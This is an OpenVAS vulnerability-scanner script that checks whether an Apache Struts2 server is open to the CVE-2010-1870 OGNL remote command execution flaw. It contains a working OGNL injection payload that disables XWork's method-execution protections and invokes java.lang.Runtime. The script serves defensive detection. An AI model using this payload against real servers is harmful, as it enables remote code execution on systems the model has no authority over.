##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_apache_struts_xwork_cmd_exec_vuln.nasl 13960 2019-03-01 13:18:27Z cfischer $
#
# Apache Struts2/XWork Remote Command Execution Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:apache:struts";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801663");
  script_version("$Revision: 13960 $");
  script_cve_id("CVE-2010-1870");
  script_bugtraq_id(41592);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2019-03-01 14:18:27 +0100 (Fri, 01 Mar 2019) $");
  script_tag(name:"creation_date", value:"2010-12-21 15:42:46 +0100 (Tue, 21 Dec 2010)");
  script_name("Apache Struts2/XWork Remote Command Execution Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_apache_struts2_detection.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("ApacheStruts/installed");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/14360/");
  script_xref(name:"URL", value:"http://struts.apache.org/2.2.1/docs/s2-005.html");
  script_xref(name:"URL", value:"http://blog.o0o.nu/2010/07/cve-2010-1870-struts2xwork-remote.html");

  script_tag(name:"summary", value:"This host is running Struts and is prone to
  remote command execution vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP POST request
  and check whether it is is able to execute remote code or not.");

  script_tag(name:"insight", value:"The flaw is due to an error in 'OGNL' extensive
  expression evaluation capability in XWork in Struts, uses as permissive whitelist,
  which allows remote attackers to modify server-side context objects and bypass the '#'
  protection mechanism in ParameterInterceptors via various variables.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to
  manipulate server-side context objects with the privileges of the user running the application.");

  script_tag(name:"affected", value:"Struts version 2.0.0 through 2.1.8.1");

  script_tag(name:"solution", value:"Upgrade to Struts version 2.2 or later.");

  script_tag(name:"qod_type", value:"exploit");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://struts.apache.org/download.cgi");
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";
url = dir + "/example/HelloWorld.action";

req = http_get( item:url, port:port );
res = http_keepalive_send_recv( port:port, data:req );

if( "<title>Struts" >< res ) {

  ## OGNL (Object Graph Navigation Language)
  ognl = "?('\\u0023_memberAccess[\\'allowStaticMethodAccess\\']')(meh)=true&(aaa)(('"+
         "\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003d\\u0023" +
         "foo')(\\u0023foo\\u003dnew%20java.lang.Boolean('false')))&(asdf)(('\\u0023" +
         "rt.exit(1)')(\\u0023rt\\u003d@java.lang.Runtime@getRuntime()))=1";
  url += ognl;

  if( http_vuln_check( port:port, url:url, pattern:'<a href=".*xwork.MethodAccessor.denyMethodExecution', check_header:TRUE ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );